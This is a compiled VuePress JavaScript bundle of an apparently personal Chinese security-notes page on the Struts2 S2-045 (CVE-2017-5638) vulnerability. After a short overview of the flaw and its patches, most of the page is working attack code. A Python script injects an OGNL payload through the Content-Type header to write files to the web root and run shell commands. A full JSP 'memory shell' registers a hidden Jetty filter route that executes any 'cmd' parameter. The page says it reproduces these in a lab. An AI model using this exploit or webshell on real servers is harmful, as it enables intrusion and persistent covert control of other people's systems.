import{_ as l}from"./plugin-vue_export-helper-DlAUqK2U.js";import{r as i,o,c as r,a as e,d as s,b as t,e as a}from"./app-CfOWTlTS.js";const c={},d=e("h1",{id:"s2-045内存马",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#s2-045内存马"},[e("span",null,"s2-045内存马")])],-1),u={href:"https://www.cnblogs.com/tide-sec/p/16304736.html",target:"_blank",rel:"noopener noreferrer"},p={href:"http://pirogue.org/2017/03/09/s2-045%E7%9C%9F%E6%AD%A3%E4%B8%80%E9%94%AEgetshell%E8%8F%9C%E5%88%80%E9%A9%AC-%E7%AA%81%E7%A0%B4%E4%BB%BB%E4%BD%95%E9%99%90%E5%88%B6/",target:"_blank",rel:"noopener noreferrer"},v=a('<hr><h2 id="漏洞概述" tabindex="-1"><a class="header-anchor" href="#漏洞概述"><span>漏洞概述</span></a></h2><ul><li>漏洞编号: CVE-2017-5638 Struts2远程代码执行漏洞</li><li>漏洞类型: 远程代码执行漏洞</li><li>危险等级: 高危</li><li>利用条件: Struts2在受影响版本内，并包含Commons-FileUpload、Commons-IO库</li><li>受影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</li></ul><p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。</p><p>Struts2在受影响版本内，并包含Commons-FileUpload、Commons-IO库时, 该漏洞能够通过构造恶意的 Content-Type 值来执行任意代码。 如果 Content-Type 值无效，则会抛出异常，并向用户显示错误消息，从而能够进一步获取服务器权限。</p><ul><li>安装官方补丁升级到最新版本: Struts 2.3.32 or Struts 2.5.10.1</li><li>临时修复方法: Struts2 默认使用 Jakarta 的 Common-FileUpload 文件上传解析器, 修改上传解析器为cos或pell。</li></ul><hr><h2 id="漏洞分析" tabindex="-1"><a class="header-anchor" href="#漏洞分析"><span>漏洞分析</span></a></h2>',8),m={href:"https://github.com/Y4tacker/JavaSec/blob/main/7.Struts2%E4%B8%93%E5%8C%BA/S2-045%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.md",target:"_blank",rel:"noopener noreferrer"},b=a(`<hr><h2 id="命令执行写文件" tabindex="-1"><a class="header-anchor" href="#命令执行写文件"><span>命令执行写文件</span></a></h2><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">import</span> httpx
<span class="token keyword">from</span> pathlib <span class="token keyword">import</span> Path
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse


<span class="token comment"># 定义读取文件内容的函数</span>
<span class="token keyword">def</span> <span class="token function">read_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">&quot;r&quot;</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">&quot;utf-8&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token comment"># 读取 index.jsp 文件的内容</span>
CURRENT_DIR <span class="token operator">=</span> Path<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>parent
<span class="token comment"># file_path = CURRENT_DIR / &#39;index.jsp&#39;</span>
file_path <span class="token operator">=</span> CURRENT_DIR <span class="token operator">/</span> <span class="token string">&quot;testFile.txt&quot;</span>

content <span class="token operator">=</span> read_file<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
<span class="token comment"># encoded_content = content.encode(&#39;utf-8&#39;)</span>
content_encoded <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>content<span class="token punctuation">)</span>

<span class="token comment"># 设置请求的 URL</span>
url <span class="token operator">=</span> <span class="token string">&quot;http://192.168.1.215:8080/&quot;</span>

<span class="token comment"># filename = &quot;/index.jsp&quot;</span>
filename <span class="token operator">=</span> <span class="token string">&quot;/testFile.txt&quot;</span>


<span class="token comment"># 设置请求头</span>
headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&quot;Upgrade-Insecure-Requests&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;Accept&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;Accept-Language&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;en-US,en;q=0.8,es;q=0.6&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;Connection&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;close&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;%{{(#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ccccc=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;).getSession().getServletContext().getRealPath(&#39;/&#39;)).(#shell=&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>content_encoded<span class="token punctuation">}</span></span><span class="token string">&#39;).(new java.io.BufferedWriter(new java.io.FileWriter(#path+&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>filename<span class="token punctuation">}</span></span><span class="token string">&#39;).append(new java.net.URLDecoder().decode(#shell,&#39;UTF-8&#39;))).close()).(#cmd=&#39;echo \\\\\\&quot;write file to &#39;+#path+&#39;\\&quot;+ self.num +\\&quot;t00ls.jsp\\\\\\&quot;&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}}:{{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd}})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}}.multipart/form-data&quot;</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>

<span class="token comment"># 发送 POST 请求</span>
response <span class="token operator">=</span> httpx<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>

<span class="token comment"># 打印响应结果</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409201522232.png" alt="image-20240920152239164"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409201523134.png" alt="image-20240920152302098"></p><hr><h2 id="命令执行写-filter-内存马" tabindex="-1"><a class="header-anchor" href="#命令执行写-filter-内存马"><span>命令执行写 Filter 内存马</span></a></h2><p>适用于当前环境的 Filter 内存马:</p><div class="language-jsp line-numbers-mode" data-ext="jsp" data-title="jsp"><pre class="language-jsp"><code>&lt;%@ page import=&quot;java.lang.reflect.Field&quot;%&gt;
&lt;%@ page import=&quot;java.lang.reflect.Method&quot;%&gt;
&lt;%@ page import=&quot;java.util.Scanner&quot;%&gt;
&lt;%@ page import=&quot;java.util.EnumSet&quot;%&gt;
&lt;%@ page import=&quot;java.io.*&quot;%&gt;

&lt;%
    String filterName = &quot;myFilter&quot;;
    String urlPattern = &quot;/filter&quot;;
    Filter filter = new Filter() {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }
        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            if (req.getParameter(&quot;cmd&quot;) != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty(&quot;os.name&quot;);
                if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[] {&quot;sh&quot;, &quot;-c&quot;, req.getParameter(&quot;cmd&quot;)} : new String[] {&quot;cmd.exe&quot;, &quot;/c&quot;, req.getParameter(&quot;cmd&quot;)};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner( in ).useDelimiter(&quot;\\\\a&quot;);
                String output = s.hasNext() ? s.next() : &quot;&quot;;
                servletResponse.getWriter().write(output);
                servletResponse.getWriter().flush();
                return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }
        @Override
        public void destroy() {
        }
    };

    Method threadMethod = Class.forName(&quot;java.lang.Thread&quot;).getDeclaredMethod(&quot;getThreads&quot;);
    threadMethod.setAccessible(true);
    Thread[] threads = (Thread[]) threadMethod.invoke(null);
    ClassLoader threadClassLoader = null;

    for (Thread thread:threads)
    {
        threadClassLoader = thread.getContextClassLoader();
        if(threadClassLoader != null){
            if(threadClassLoader.toString().contains(&quot;WebAppClassLoader&quot;)){
                Field fieldContext = threadClassLoader.getClass().getDeclaredField(&quot;_context&quot;);
                fieldContext.setAccessible(true);
                Object webAppContext = fieldContext.get(threadClassLoader);
                
                // 打印调试信息
                out.println(&quot;webAppContext class: &quot; + webAppContext.getClass().getName() + &quot;&lt;br&gt;&quot;);
                out.println(&quot;webAppContext superclass: &quot; + webAppContext.getClass().getSuperclass().getName() + &quot;&lt;br&gt;&quot;);
                
                try {
                    // 获取 _servletHandler 字段
                    Field fieldServletHandler = webAppContext.getClass().getSuperclass().getSuperclass().getDeclaredField(&quot;_servletHandler&quot;);
                    fieldServletHandler.setAccessible(true);
                    Object servletHandler = fieldServletHandler.get(webAppContext);
                    Field fieldFilters = servletHandler.getClass().getDeclaredField(&quot;_filters&quot;);
                    fieldFilters.setAccessible(true);
                    Object[] filters = (Object[]) fieldFilters.get(servletHandler);
                    boolean flag = false;
                    for(Object f:filters){
                        Field fieldName = f.getClass().getSuperclass().getDeclaredField(&quot;_name&quot;);
                        fieldName.setAccessible(true);
                        String name = (String) fieldName.get(f);
                        if(name.equals(filterName)){
                            flag = true;
                            break;
                        }
                    }
                    if(flag){
                        out.println(&quot;[-] Filter &quot; + filterName + &quot; exists.&lt;br&gt;&quot;);
                        return;
                    }
                    out.println(&quot;[+] Add Filter: &quot; + filterName + &quot;&lt;br&gt;&quot;);
                    out.println(&quot;[+] urlPattern: &quot; + urlPattern + &quot;&lt;br&gt;&quot;);
                    ClassLoader classLoader = servletHandler.getClass().getClassLoader();
                    Class sourceClazz = null;
                    Object holder = null;
                    Field field = null;
                    try{
                        sourceClazz = classLoader.loadClass(&quot;org.eclipse.jetty.servlet.Source&quot;);
                        field = sourceClazz.getDeclaredField(&quot;JAVAX_API&quot;);
                        Method method = servletHandler.getClass().getMethod(&quot;newFilterHolder&quot;, sourceClazz);
                        holder = method.invoke(servletHandler, field.get(null));
                    }catch(ClassNotFoundException e){
                        sourceClazz = classLoader.loadClass(&quot;org.eclipse.jetty.servlet.BaseHolder$Source&quot;);
                        Method method = servletHandler.getClass().getMethod(&quot;newFilterHolder&quot;, sourceClazz);
                        holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, &quot;JAVAX_API&quot;));
                    }
                    holder.getClass().getMethod(&quot;setName&quot;, String.class).invoke(holder, filterName);               
                    holder.getClass().getMethod(&quot;setFilter&quot;, Filter.class).invoke(holder, filter);
                    servletHandler.getClass().getMethod(&quot;addFilter&quot;, holder.getClass()).invoke(servletHandler, holder);

                    Class  clazz         = classLoader.loadClass(&quot;org.eclipse.jetty.servlet.FilterMapping&quot;);
                    Object filterMapping = clazz.newInstance();
                    Method method        = filterMapping.getClass().getDeclaredMethod(&quot;setFilterHolder&quot;, holder.getClass());
                    method.setAccessible(true);
                    method.invoke(filterMapping, holder);
                    filterMapping.getClass().getMethod(&quot;setPathSpecs&quot;, String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});
                    filterMapping.getClass().getMethod(&quot;setDispatcherTypes&quot;, EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
                    servletHandler.getClass().getMethod(&quot;prependFilterMapping&quot;, filterMapping.getClass()).invoke(servletHandler, filterMapping);
                } catch (NoSuchFieldException e) {
                    out.println(&quot;Error: &quot; + e.getMessage() + &quot;&lt;br&gt;&quot;);
                }
            }     
        }
    }
%&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>和上一步写文件的操作一样, 将此 JSP 内容写入到 webapp 目录下, 访问此文件对应 URL, 第二次访问如果注册成功会输出 <code>Filter myFilter exists</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409201526590.png" alt="image-20240920152602531"></p><p>然后使用注入的 filter 路由执行命令即可:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409201526648.png" alt="image-20240920152653579"></p><hr><h2 id="servlet马" tabindex="-1"><a class="header-anchor" href="#servlet马"><span>Servlet马</span></a></h2>`,15),g=e("p",null,"TODO: vulhub docker 没复现出来, 暂且搁置",-1),h={href:"https://www.cnblogs.com/tide-sec/p/16304736.html",target:"_blank",rel:"noopener noreferrer"},q=e("hr",null,null,-1),k=e("h2",{id:"其他内存马",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#其他内存马"},[e("span",null,"其他内存马")])],-1),f=e("p",null,"Github 全局搜索找到的一个 Struts2 内存马, 但是没看出来作用:",-1),C={href:"https://github.com/qi4L/JYso/blob/master/src/main/java/com/qi4l/JYso/template/memshellStatic/struts2/Struts2ActionMS.java",target:"_blank",rel:"noopener noreferrer"};function S(E,_){const n=i("ExternalLinkIcon");return o(),r("div",null,[d,e("blockquote",null,[e("p",null,[e("a",u,[s("S2-045 写入内存马 - ccadmin - 博客园 (cnblogs.com)"),t(n)])]),e("p",null,[e("a",p,[s("s2-045真正一键getshell菜刀马-突破任何限制 | pirogue"),t(n)])])]),v,e("blockquote",null,[e("p",null,[e("a",m,[s("JavaSec/7.Struts2专区/S2-045漏洞分析/index.md at main · Y4tacker/JavaSec (github.com)"),t(n)])])]),b,e("blockquote",null,[g,e("p",null,[e("a",h,[s("S2-045 写入内存马 - ccadmin - 博客园 (cnblogs.com)"),t(n)])])]),q,k,e("ul",null,[e("li",null,[f,e("p",null,[e("a",C,[s("JYso/src/main/java/com/qi4l/JYso/template/memshellStatic/struts2/Struts2ActionMS.java at master · qi4L/JYso (github.com)"),t(n)])])])])])}const w=l(c,[["render",S],["__file","s2-045内存马.html.vue"]]),F=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Struts2%E5%86%85%E5%AD%98%E9%A9%AC/s2-045%E5%86%85%E5%AD%98%E9%A9%AC.html","title":"s2-045内存马","lang":"zh-CN","frontmatter":{},"headers":[{"level":2,"title":"漏洞概述","slug":"漏洞概述","link":"#漏洞概述","children":[]},{"level":2,"title":"漏洞分析","slug":"漏洞分析","link":"#漏洞分析","children":[]},{"level":2,"title":"命令执行写文件","slug":"命令执行写文件","link":"#命令执行写文件","children":[]},{"level":2,"title":"命令执行写 Filter 内存马","slug":"命令执行写-filter-内存马","link":"#命令执行写-filter-内存马","children":[]},{"level":2,"title":"Servlet马","slug":"servlet马","link":"#servlet马","children":[]},{"level":2,"title":"其他内存马","slug":"其他内存马","link":"#其他内存马","children":[]}],"git":{"createdTime":1726628430000,"updatedTime":1726825854000,"contributors":[{"name":"233","email":"ayusummer233@vip.qq.com","commits":2}]},"readingTime":{"minutes":3.78,"words":1135},"filePathRelative":"网络安全/Web安全/内存马/Java内存马/Struts2内存马/s2-045内存马.md","localizedDate":"2024年9月18日","excerpt":"\\n<blockquote>\\n<p><a href=\\"https://www.cnblogs.com/tide-sec/p/16304736.html\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">S2-045 写入内存马 - ccadmin - 博客园 (cnblogs.com)</a></p>\\n<p><a href=\\"http://pirogue.org/2017/03/09/s2-045%E7%9C%9F%E6%AD%A3%E4%B8%80%E9%94%AEgetshell%E8%8F%9C%E5%88%80%E9%A9%AC-%E7%AA%81%E7%A0%B4%E4%BB%BB%E4%BD%95%E9%99%90%E5%88%B6/\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">s2-045真正一键getshell菜刀马-突破任何限制 | pirogue</a></p>\\n</blockquote>"}');export{w as comp,F as data};
